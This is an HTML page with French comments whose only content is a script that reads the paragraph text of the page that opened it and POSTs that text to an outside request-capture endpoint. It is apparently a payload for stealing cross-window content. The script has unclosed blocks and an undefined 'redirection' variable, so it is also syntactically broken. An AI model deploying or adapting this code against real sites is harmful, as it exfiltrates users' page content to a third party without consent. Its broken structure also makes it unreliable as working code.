<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body id="body">
  <script>
    
  setTimeout(() => {
  // Vérifie si l'opener est disponible
  if (redirection && redirection.opener) {
    const paragraphs = redirection.opener.document.querySelectorAll('p');

    console.log(paragraphs)
    let text = "";
      
    // Récupérer tout le texte des balises <p>
    paragraphs.forEach(paragraph => {
      text = text + paragraph.textContent + "\n";
    });
      
    fetch("https://volatile.free.beeceptor.com", {
      method: "POST",  // Utiliser POST pour envoyer des données
      headers: {
        "Content-Type": "application/json",  // Spécifier le type de contenu
      },
      body: JSON.stringify({
        text: text,  // Envoyer le texte récupéré
      })
    })
      .then(response => response.json())  // Traiter la réponse
      .then(data => {
        console.log('Réponse du serveur:', data);
      })
      .catch(error => {
        console.error('Erreur:', error);
      });
      
  </script>
</body>
